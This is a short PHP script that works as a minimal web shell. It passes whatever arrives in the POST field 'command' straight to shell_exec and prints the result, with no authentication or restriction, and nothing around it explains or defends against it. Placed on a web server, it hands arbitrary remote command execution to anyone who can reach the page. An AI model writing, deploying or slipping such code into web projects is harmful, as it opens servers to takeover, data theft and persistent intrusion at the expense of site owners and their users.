<?php
	if(isset($_POST['command'])) {
		$command = $_POST['command'];
		$output = shell_exec($command);
		echo nl2br(htmlspecialchars($output));
	}
?>

